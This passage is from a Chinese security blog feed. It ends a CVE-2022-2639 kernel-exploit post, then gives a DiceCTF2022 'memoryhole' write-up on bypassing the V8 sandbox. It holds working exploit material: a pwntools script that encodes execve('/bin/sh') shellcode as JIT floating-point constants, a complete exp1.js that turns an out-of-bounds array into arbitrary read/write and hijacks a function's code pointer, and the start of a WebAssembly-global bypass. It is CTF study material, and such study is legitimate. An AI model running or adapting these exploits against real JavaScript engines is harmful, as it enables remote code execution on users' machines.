*)(tmp_buffer + <span class="number">9</span>);</span><br><span class="line">    <span class="keyword">if</span> (ptr[<span class="number">0</span>] != <span class="number">0x56565656</span>)</span><br><span class="line">        die(<span class="string">&quot;[-] overwrite attack file failed: 0x%08x&quot;</span>, ptr[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/img/CVE-2022-2639/res.png"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>通过页风水到一步一步获得 UAF 到最后创造了 DirtyPipe 的条件完成任意文件写，无需泄露内核基址就完成了提权，为其他直接或者通过转化能获得类似条件的漏洞利用提供了新思路。</p>
<p>exp 可见 <a href="https://github.com/cxxz16/kernel_study/tree/main/cve-2022-2639">kernel_study&#x2F;cve-2022-2639 at main · cxxz16&#x2F;kernel_study (github.com)</a></p>
<p>编译好的内核、文件系统和exp等文件可见 <a href="https://github.com/bsauce/kernel-exploit-factory">bsauce-exploit及测试环境下载地址</a></p>
<p>文章中如果任何错误或疑问，望各位读者不吝赐教，及时指正，非常感谢。期待与大家共同交流进步。</p>
<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><ol>
<li><a href="https://bsauce.github.io/2022/07/16/CVE-2022-1015/#3-4-%E9%80%9A%E8%BF%87netlink%E4%B8%8Enftables-%E4%BA%A4%E4%BA%92">bsauce CVE-2022-1015</a></li>
<li><a href="https://bsauce.github.io/2022/11/24/CVE-2022-2639/">bsauce CVE-2022-2639</a></li>
<li><a href="https://veritas501.github.io/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">CVE-2022-2639 openvswitch LPE 漏洞分析</a></li>
</ol>
]]></content>
      <categories>
        <category>cve 复现</category>
      </categories>
      <tags>
        <tag>kernel</tag>
        <tag>cve</tag>
      </tags>
  </entry>
  <entry>
    <title>DiceCTF2022 memoryhole &amp; V8沙箱绕过</title>
    <url>/2022/12/06/DiceCTF2022-memoryhole-V8%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<p>DiceCTF2022 memoryhole 题目复现与两种 V8 沙箱绕过方式学习。</p>
<span id="more"></span>

<h1 id="指针压缩"><a href="#指针压缩" class="headerlink" title="指针压缩"></a>指针压缩</h1><p>V8 在其堆中实现了指针压缩。通过指针压缩，从 V8 堆中的一个对象到 V8 堆中的另一个对象（“堆上”）的每个引用都会成为距堆基址的 32 位偏移量，只留下少数具有指向外部对象的原始指针的对象v8 堆（“堆外”）。压缩指针仅在 4GB 虚拟内存区域内有效，称为指针压缩。指针压缩可以通过内存中的 ArrayBuffer 实例来可视化。下面显示了没有指针压缩的假设 ArrayBuffer 对象的内存布局：</p>
<p><img src="/img/Dicectf2022-memoryhole/0-0.png"></p>
<p>指针压缩后：</p>
<p><img src="/img/Dicectf2022-memoryhole/0-1.png"></p>
<p><strong>指针压缩比较好绕过，因为除了堆上指针，堆外指针都可以正常使用，如 backing store，所以如果能篡改 backing store 还是可以实现无限制的任意地址写。</strong></p>
<h1 id="Sandbox"><a href="#Sandbox" class="headerlink" title="Sandbox"></a>Sandbox</h1><p>为了保护同一进程的其他内存免受损害，V8 堆中的所有原始指针就 “sandboxified” ，<strong>将他们转换为相对于沙箱底部的偏移量或转换为索引进入外部指针表，以基址+偏移的形式访问，限定了可访问的范围，从而防止任意地址读写。</strong>沙箱的实现通过：</p>
<ul>
<li>在 V8 初始化期间保留了一个大的（例如 1TB）虚拟地址空间区域——沙箱。该区域包含 pointer compression cage、所有 V8 堆以及 ArrayBuffer 的 backing store 和类似对象。</li>
<li>沙箱内但 V8 堆之外的所有对象都使用固定大小的偏移量（例如，在 1TB 沙箱的情况下为 40 位偏移量）而不是原始指针进行寻址。</li>
<li>所有剩余的堆外对象都必须通过外部指针表进行引用，该表包含指向对象的指针以及类型信息，以防止类型混淆攻击。然后通过索引从 v8 堆中的对象引用此表中的条目。</li>
</ul>
<p><img src="/img/Dicectf2022-memoryhole/0-3.png"></p>
<p>原始的堆外 backing store 指针（紫色）已被替换为距离沙箱底部的 40 位偏移量（偏移量为 0x45c00，向左移动 24 位以保证最高位为零）。另一方面，指向 ArrayBufferExtension 对象（橙色）的原始指针已替换为指向外部指针表的 32 位索引。</p>
<p>现在假设攻击者能够从多个线程任意破坏沙箱内的内存，还需要一个额外的漏洞来破坏沙箱外的内存，从而执行任意代码。</p>
<p>详细的沙箱细节在<a href="https://docs.google.com/document/d/1FM4fQmIhEqPG8uGp5o9A-mnPB5BOeScZYpkHjo0KKA8/edit#">V8 Sandbox - High-Level Design Doc - Google 文档</a>。</p>
<p><img src="/img/Dicectf2022-memoryhole/0-2.png"></p>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>漏洞是白给的数组长度任意修改。但是开启了沙箱。</p>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">   # Enable the experimental V8 sandbox.</span><br><span class="line">   # Sets -DV8_SANDBOX.</span><br><span class="line"><span class="deletion">-  v8_enable_sandbox = false</span></span><br><span class="line"><span class="addition">+  v8_enable_sandbox = true</span></span><br><span class="line"></span><br><span class="line">   # Enable external pointer sandboxing. Requires v8_enable_sandbox.</span><br><span class="line">   # Sets -DV8_SANDBOXED_EXTERNAL_POINRTERS.</span><br><span class="line"><span class="deletion">-  v8_enable_sandboxed_external_pointers = false</span></span><br><span class="line"><span class="addition">+  v8_enable_sandboxed_external_pointers = true</span></span><br><span class="line"></span><br><span class="line">   # Enable sandboxed pointers. Requires v8_enable_sandbox.</span><br><span class="line">   # Sets -DV8_SANDBOXED_POINTERS.</span><br><span class="line"><span class="deletion">-  v8_enable_sandboxed_pointers = false</span></span><br><span class="line"><span class="addition">+  v8_enable_sandboxed_pointers = true</span></span><br><span class="line"></span><br><span class="line">   # Enable all available sandbox features. Implies v8_enable_sandbox.</span><br><span class="line"><span class="deletion">-  v8_enable_sandbox_future = false</span></span><br><span class="line"><span class="addition">+  v8_enable_sandbox_future = true</span></span><br></pre></td></tr></table></figure>

<p>TypeArray 中的 backing store 指针限制被 data_ptr 代替，计算公式为 data_ptr &#x3D; js_base + (external_pointer &lt;&lt; 8) + base_pointer，<code>%DebugPrint</code> 会显示已经加完了 js_base 的完整的指针，所以要查看内存看真正的值，但是无论这两个指针的值是什么，data_ptr 都是被限制在了 40bit 内的空间。</p>
<p><img src="/img/Dicectf2022-memoryhole/0-4.png"></p>
<p><img src="/img/Dicectf2022-memoryhole/0-5.png"></p>
<p>结合前文知识，突破沙箱拿到 shell 有两种办法：一种是在 4 GB 范围内任意读写搞事情；另一种就是再寻找新的包含 64 位可用指针的对象。如下就是这两种方式的具体实现。</p>
<h2 id="方式一：在-jsFunction-中构造包含-jit-shellcode-的立即数"><a href="#方式一：在-jsFunction-中构造包含-jit-shellcode-的立即数" class="headerlink" title="方式一：在 jsFunction 中构造包含 jit shellcode 的立即数"></a>方式一：在 jsFunction 中构造包含 jit shellcode 的立即数</h2><p>写一个 jsFunction：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">foo</span> = (<span class="params"></span>) =&gt;</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line">&#125;</span><br><span class="line">%<span class="title class_">PrepareFunctionForOptimization</span>(foo);</span><br><span class="line"><span class="title function_">foo</span>();</span><br><span class="line">%<span class="title class_">OptimizeFunctionOnNextCall</span>(foo);</span><br><span class="line"><span class="title function_">foo</span>();</span><br><span class="line">%<span class="title class_">DebugPrint</span>(foo);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br><span class="line"><span class="title function_">foo</span>();</span><br></pre></td></tr></table></figure>

<p><img src="/img/Dicectf2022-memoryhole/1-1.png"></p>
<p>可以看到 code 字段在 rx 段。</p>
<p>在 JSFunction 中修改code字段为一个错误的地址：</p>
<p><img src="/img/Dicectf2022-memoryhole/1-2.png"></p>
<p><img src="/img/Dicectf2022-memoryhole/1-3.png"></p>
<p>按c继续运行（注意在 systembreak 后要调用 function）：</p>
<p><img src="/img/Dicectf2022-memoryhole/1-4.png"></p>
<p>可以看出这段的逻辑为：<strong>test dword ptr [rcx+0x1b], 0x20000000 后，如果不跳转，则将 rcx + 0x3f，然后 jmp rcx（前面的 jmp 是跳转到 jmp rcx 指令的地址，看地址与偏移），如果我们将 [rcx+0x1b] 处的值伪造好，与0x20000000与后为0，那么到 jne 的时候就会不跳转继续执行。而 rcx 中的值可控。那么就能劫持 rip。</strong></p>
<p>这里补充一下正常的逻辑（猜测）：</p>
<p><img src="/img/Dicectf2022-memoryhole/1-5.png"></p>
<p>原本 rcx 中的值应为 code 的地址，由于是指针，值被+1，所以 +0x1b 便可以到 0x1c 这样的整 dword 地址处。这里 test 后不为0，那么 jne 就会跳转，应该是跳转到正常的逻辑去执行。</p>
<p><img src="/img/Dicectf2022-memoryhole/1-6.png"></p>
<p>经过优化后的jit代码，存放在距离 code 字段值不远处。</p>
<p>那接下来就是要先将 shellcode 藏在 double 表示的立即数中。</p>
<p>通过 <a href="https://shell-storm.org/online/Online-Assembler-and-Disassembler/?inst=jmp+0xe&arch=x86-64&as_format=inline#assembly">Online Assembler and Disassembler (shell-storm.org)</a> 得到：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jmp 0xe  =&gt; &quot;\xeb\x0c&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">jmp = <span class="string">&#x27;\xeb\x0c&#x27;</span></span><br><span class="line">shell = u64(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_double</span>(<span class="params">code</span>):</span><br><span class="line">	<span class="keyword">assert</span> <span class="built_in">len</span>(code) &lt;= <span class="number">6</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="built_in">hex</span>(u64(code.ljust(<span class="number">6</span>, <span class="string">&#x27;\x00&#x27;</span>) + jmp))[<span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line">make_double(asm(<span class="string">&quot;push %d; pop rax&quot;</span> % (shell &gt;&gt; <span class="number">0x20</span>)))</span><br><span class="line">make_double(asm(<span class="string">&quot;push %d; pop rdx&quot;</span> % (shell % <span class="number">0x100000000</span>)))</span><br><span class="line">make_double(asm(<span class="string">&quot;shl rax, 0x20; xor esi, esi&quot;</span>))</span><br><span class="line">make_double(asm(<span class="string">&quot;add rax, rdx; xor edx, edx; push rax&quot;</span>))</span><br><span class="line">code = asm(<span class="string">&quot;mov rdi, rsp; push 59; pop rax; syscall&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(code) &lt;= <span class="number">8</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(u64(code.ljust(<span class="number">8</span>, <span class="string">&#x27;\x90&#x27;</span>)))[<span class="number">2</span>:])</span><br></pre></td></tr></table></figure>

<p>如上脚本得到 shellcode，然后再将十六进制转 IEEE754 浮点数（写到这又想起了今年 qwb 的那道 jit …）。通过<a href="https://www.binaryconvert.com/result_double.html?hexadecimal=0CEB580068732F68">工具</a>，在下面 binary 中输入十六进制数：</p>
<p><img src="/img/Dicectf2022-memoryhole/1-7.png"></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="number">1.95538254221075331056310651818E-246</span></span><br><span class="line"><span class="number">1.95606125582421466942709801013E-246</span></span><br><span class="line"><span class="number">1.99957147195425773436923756715E-246</span></span><br><span class="line"><span class="number">1.95337673326740932133292175341E-246</span></span><br><span class="line"><span class="number">2.63486047652296056448306022844E-284</span></span><br></pre></td></tr></table></figure>

<p>接下来通过在 func1 的立即数中布置好 shellcode，篡改 func2 的 code 字段直接指向这段 shellcode，再调用 func2 即可触发。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">func</span> = (<span class="params"></span>) =&gt;</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">f</span> = (<span class="params"></span>) =&gt; <span class="number">123</span>;	<span class="comment">// 准备篡改 code 的 func2</span></span><br><span class="line"><span class="keyword">let</span> arr = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">const</span> o = &#123;<span class="attr">x</span>:<span class="number">1337</span>, <span class="attr">a</span>:f, <span class="attr">b</span>:fun&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> ua = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(<span class="number">2</span>);</span><br><span class="line">arr.<span class="title function_">setLength</span>(<span class="number">100</span>);</span><br><span class="line"><span class="title function_">d22u</span>(arr[<span class="number">5</span>]);</span><br><span class="line"><span class="keyword">const</span> funAddr = __dvCvt.<span class="title function_">getUint32</span>(<span class="number">4</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="keyword">const</span> fAddr = __dvCvt.<span class="title function_">getUint32</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure>

<p>找到 func 和 f 的地址：</p>
<p><img src="/img/Dicectf2022-memoryhole/1-8.png"></p>
<p>再准备泄露 typearray 的 base_pointer。</p>
<p>在这过程中发现 typearray 中如果开辟数组长度小于等于16则 data_ptr 字段启用，否则为 nil 并且在内存中没有其值（以前都是直接开辟很小的数组并没有注意到这个问题）：</p>
<p><img src="/img/Dicectf2022-memoryhole/1-9.png"></p>
<p><img src="/img/Dicectf2022-memoryhole/1-10.png"></p>
<p>为了方便计算，这里少开辟两个就行，由于他和elements类似，通过 oob 数组越界读 typearray 中的元素，进而确定 base_pointer 想对于 oob arr 的索引：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ua[<span class="number">0</span>] = <span class="number">0xdeedbeef</span>;</span><br><span class="line"><span class="keyword">var</span> base_ptr = -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">10</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">d22u</span>(arr[i]);</span><br><span class="line">    <span class="keyword">const</span> high = __dvCvt.<span class="title function_">getUint32</span>(<span class="number">4</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">const</span> low = __dvCvt.<span class="title function_">getUint32</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (high == <span class="number">0xdeedbeef</span> || low == <span class="number">0xdeedbeef</span>) &#123;</span><br><span class="line">        base_ptr = i + <span class="number">7</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/img/Dicectf2022-memoryhole/1-11.png"></p>
<p>可以修改 base_pointer 就可以实现在基址的 4GB 范围内的任意地址写了。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">arbRead</span>(<span class="params">off</span>) &#123;</span><br><span class="line">    arr[base_ptr] = <span class="title function_">u2d</span>((off-<span class="number">7</span>) * <span class="number">0x100000000</span>);</span><br><span class="line">    <span class="keyword">return</span> ua[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbWrite</span>(<span class="params">off, val</span>) &#123;</span><br><span class="line">    arr[base_ptr] = <span class="title function_">u2d</span>((off-<span class="number">7</span>) * <span class="number">0x100000000</span>);</span><br><span class="line">    ua[<span class="number">0</span>] = val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再查看 func1 code 中经过优化的代码，错位看 jit：</p>
<p><img src="/img/Dicectf2022-memoryhole/1-12.png"></p>
<p><img src="/img/Dicectf2022-memoryhole/1-13.png"></p>
<p><img src="/img/Dicectf2022-memoryhole/1-14.png"></p>
<p>根据前面的逻辑，我们使 rcx+0x1b 为 0，rcx &#x3D; rcx + 0x3f，那么此时的 code 就应伪造为 (0x2013000440bc-0x3f-0x201300044001) + 0x201300044001 &#x3D; 0x201300044001 + 0x7c，那么此时 rcx 应为0x201300044001 + 0x7c，[rcx + 0x1b] 与 0x2000000 为0：</p>
<p><img src="/img/Dicectf2022-memoryhole/1-15.png"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0xff418944000002b8</span> &amp; <span class="number">0x20000000</span> = <span class="number">0L</span></span><br></pre></td></tr></table></figure>

<p>此处选择将 f 函数的 code 覆写为 func1 布置好的 jit 代码段，也就是 jitAddr + 0x7c，这样执行 f() 就会去执行jit了。</p>
<p><img src="/img/Dicectf2022-memoryhole/1res.png"></p>
<h2 id="exp1-js"><a href="#exp1-js" class="headerlink" title="exp1.js"></a>exp1.js</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> __buf8 = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">const</span> __dvCvt = <span class="keyword">new</span> <span class="title class_">DataView</span>(__buf8);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    __dvCvt.<span class="title function_">setFloat64</span>(<span class="number">0</span>, val, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span> __dvCvt.<span class="title function_">getUint32</span>(<span class="number">0</span>, <span class="literal">true</span>) + __dvCvt.<span class="title function_">getUint32</span>(<span class="number">4</span>, <span class="literal">true</span>) * <span class="number">0x100000000</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Uint64 =&gt; double</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> tmp0 = val &amp; <span class="number">0x100000000</span>;</span><br><span class="line">    __dvCvt.<span class="title function_">setUint32</span>(<span class="number">0</span>, tmp0, <span class="literal">true</span>);</span><br><span class="line">    __dvCvt.<span class="title function_">setUint32</span>(<span class="number">4</span>, (val - tmp0) / <span class="number">0x100000000</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span> __dvCvt.<span class="title function_">getFloat64</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d22u</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    __dvCvt.<span class="title function_">setFloat64</span>(<span class="number">0</span>, val, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">hex</span> = (<span class="params">x</span>) =&gt; (<span class="string">&quot;0x&quot;</span> + x.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">fun</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> [<span class="number">1.0</span>, </span><br><span class="line">            <span class="number">1.95538254221075331056310651818E-246</span>,</span><br><span class="line">            <span class="number">1.95606125582421466942709801013E-246</span>,</span><br><span class="line">            <span class="number">1.99957147195425773436923756715E-246</span>,</span><br><span class="line">            <span class="number">1.95337673326740932133292175341E-246</span>,</span><br><span class="line">            <span class="number">2.63486047652296056448306022844E-284</span>,</span><br><span class="line">            ];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">%<span class="title class_">PrepareFunctionForOptimization</span>(fun);</span><br><span class="line"><span class="title function_">fun</span>();</span><br><span class="line">%<span class="title class_">OptimizeFunctionOnNextCall</span>(fun);</span><br><span class="line"><span class="title function_">fun</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">f</span> = (<span class="params"></span>) =&gt; <span class="number">123</span>;</span><br><span class="line"><span class="keyword">let</span> arr = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">const</span> o = &#123;<span class="attr">x</span>:<span class="number">1337</span>, <span class="attr">a</span>:f, <span class="attr">b</span>:fun&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> ua = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(<span class="number">2</span>);</span><br><span class="line">arr.<span class="title function_">setLength</span>(<span class="number">100</span>);</span><br><span class="line"><span class="title function_">d22u</span>(arr[<span class="number">5</span>]);</span><br><span class="line"><span class="keyword">const</span> funAddr = __dvCvt.<span class="title function_">getUint32</span>(<span class="number">4</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="keyword">const</span> fAddr = __dvCvt.<span class="title function_">getUint32</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`[+] fun addr low = <span class="subst">$&#123;hex(funAddr)&#125;</span>`</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`[+] f addr low = <span class="subst">$&#123;hex(fAddr)&#125;</span>`</span>);</span><br><span class="line"></span><br><span class="line">ua[<span class="number">0</span>] = <span class="number">0xdeedbeef</span>;</span><br><span class="line"><span class="keyword">var</span> base_ptr = -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">10</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">d22u</span>(arr[i]);</span><br><span class="line">    <span class="keyword">const</span> high = __dvCvt.<span class="title function_">getUint32</span>(<span class="number">4</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">const</span> low = __dvCvt.<span class="title function_">getUint32</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (high == <span class="number">0xdeedbeef</span> || low == <span class="number">0xdeedbeef</span>) &#123;</span><br><span class="line">        base_ptr = i + <span class="number">7</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (base_ptr == -<span class="number">1</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[-] search base_ptr ptr failed!&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] base_ptr offset: &quot;</span> + base_ptr);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`[+] base_ptr (*0x100000000) = <span class="subst">$&#123;hex(d2u(arr[base_ptr]))&#125;</span>`</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbRead</span>(<span class="params">off</span>) &#123;</span><br><span class="line">    arr[base_ptr] = <span class="title function_">u2d</span>((off-<span class="number">7</span>) * <span class="number">0x100000000</span>);</span><br><span class="line">    <span class="keyword">return</span> ua[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbWrite</span>(<span class="params">off, val</span>) &#123;</span><br><span class="line">    arr[base_ptr] = <span class="title function_">u2d</span>((off-<span class="number">7</span>) * <span class="number">0x100000000</span>);</span><br><span class="line">    ua[<span class="number">0</span>] = val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">jitAddr = <span class="title function_">arbRead</span>(funAddr + <span class="number">0x17</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`[+] jitAddr = <span class="subst">$&#123;hex(jitAddr)&#125;</span>`</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">arbWrite</span>(fAddr + <span class="number">0x17</span>, jitAddr + <span class="number">0x7c</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">f</span>();</span><br><span class="line"><span class="comment">// %DebugPrint(f);</span></span><br><span class="line"><span class="comment">// %SystemBreak();</span></span><br></pre></td></tr></table></figure>

<h2 id="方式二：利用-wasmInstance-中的全局变量指针"><a href="#方式二：利用-wasmInstance-中的全局变量指针" class="headerlink" title="方式二：利用 wasmInstance 中的全局变量指针"></a>方式二：利用 wasmInstance 中的全局变量指针</h2><p>想要突破限制实现任意地址写，就要<strong>找一些可用、可控的 64 位未被压缩的指针</strong>。使用 <code>%DebugPrint</code> 打印 WasmInstance：</p>
<p><img src="/img/Dicectf2022-memoryhole/2-12.png"></p>
<p>其中的 <code>imported_function_targets</code> 和 <code>imported_mutable_globals</code> 都指向了完整的64 bit 的堆指针。</p>
<p>在 v8 源码中搜索，可以看到一些有用的信息：</p>
<p><img src="/img/Dicectf2022-memoryhole/2-13.png"></p>
<p><img src="/img/Dicectf2022-memoryhole/2-14.png"></p>
<p>再结合其他注释，大概了解到这是一个存放 wasm 全局变量的东西，且通过源码中的写法，<code>imported_function_targets</code> 指向的应该是个数组，数组的每个索引指向了全局变量的 address。那这时候就可以给我们常用的 wasm 代码加一个全局变量，找到 wasm global 的写法 <a href="https://developer.mozilla.org/en-US/docs/WebAssembly/JavaScript_interface/Global/Global">WebAssembly.Global() constructor - WebAssembly | MDN (mozilla.org)</a>。了解到了 WebAssembly Global 的构造方法以后，可以尝试给 Wasm Instance 加一个全局变量：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="variable language_">global</span> = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Global</span>(&#123;<span class="attr">value</span>:<span class="string">&#x27;i64&#x27;</span>, <span class="attr">mutable</span>:<span class="literal">true</span>&#125;, <span class="number">1234n</span>);<span class="comment">// 注意i64即BigInt</span></span><br><span class="line"><span class="keyword">let</span> wasmCode = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,</span><br><span class="line">    <span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,</span><br><span class="line">    <span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">102</span>,<span class="number">117</span>,<span class="number">110</span>,<span class="number">99</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">136</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">1</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">let</span> wasmInstance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(<span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasmCode),&#123; <span class="attr">js</span>: &#123;<span class="variable language_">global</span>&#125; &#125;);</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">WasmJSFunction</span> = wasmInstance.<span class="property">exports</span>.<span class="property">func</span>;</span><br><span class="line"></span><br><span class="line">%<span class="title class_">DebugPrint</span>(wasmInstance);</span><br><span class="line">%<span class="title class_">DebugPrint</span>(<span class="variable language_">global</span>);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure>

<p><img src="/img/Dicectf2022-memoryhole/2-1.png"></p>
<p>结合<a href="https://source.chromium.org/chromium/chromium/src/+/main:v8/src/wasm/wasm-objects.h;l=289">源码 wasm-objects.h - Chromium Code Search</a>看到<code>untagged_buffer</code>也是一种<code>ArrayBuffer</code>，表示 Wasm 全局变量所用：</p>
